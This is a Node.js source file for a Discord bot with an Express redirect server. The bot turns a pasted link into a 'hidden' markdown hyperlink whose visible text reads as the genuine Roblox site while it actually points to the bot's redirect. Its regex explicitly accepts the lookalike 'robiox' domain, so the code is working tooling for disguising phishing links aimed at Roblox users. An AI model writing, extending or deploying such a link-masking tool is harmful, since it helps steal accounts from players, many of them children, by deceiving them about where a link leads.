require('dotenv').config();
const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

// Заглушка для главной страницы (чтобы сервер оставался "теплым")
app.get('/', (req, res) => {
    res.send('Бот активен!');
});

// Веб-сервер для обработки редиректов
app.get('/r/:id', (req, res) => {
    const originalUrl = linksDb[req.params.id];
    console.log(`🔎 Переход по ID: ${req.params.id}, ссылка: ${originalUrl}`);
    if (originalUrl) {
        return res.redirect(originalUrl);
    }
    res.status(404).send('Ссылка не найдена или истекла');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Веб-сервер запущен на порту ${PORT}`));

client.once('ready', () => console.log(`✅ Бот ${client.user.tag} готов!`));

client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        const modal = new ModalBuilder().setCustomId('link_modal').setTitle('Создать скрытую ссылку');
        const input = new TextInputBuilder()
            .setCustomId('url_input')
            .setLabel('Вставьте ссылку на Roblox')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('https://www.roblox.com/...')
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        const url = interaction.fields.getTextInputValue('url_input');
        const id = Math.random().toString(36).substring(7);
        linksDb[id] = url;
        
        const shortUrl = `${process.env.BASE_URL}/r/${id}`;
        const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');

        // 1. Ответ в канал со смайликом
        await interaction.reply({ 
            content: `<a:verify:1513286049638518824> Check your DMs!`, 
            flags: [MessageFlags.Ephemeral] 
        });

        // 2. Отправляем в ЛС двумя сообщениями
        try {
            // Первое: Embed с заголовком
            await interaction.user.send({ 
                embeds: [{
                    color: 0x274666,
                    title: '🔗 Hyperlink Generated',
                    description: 'Your link is ready! Click on the code block below to copy it'
                }]
            });

            // Второе: Сама ссылка
            await interaction.user.send({ 
                content: `\`[${visualUrl}](${shortUrl})\`` 
            });

        } catch (error) {
            console.error('Не удалось отправить ЛС:', error);
            await interaction.followUp({ 
                content: `⚠️ Не удалось отправить ЛС. Вот ваша ссылка: \`[${visualUrl}](${shortUrl})\``, 
                flags: [MessageFlags.Ephemeral] 
            });
        }
    }
});

client.login(process.env.TOKEN);
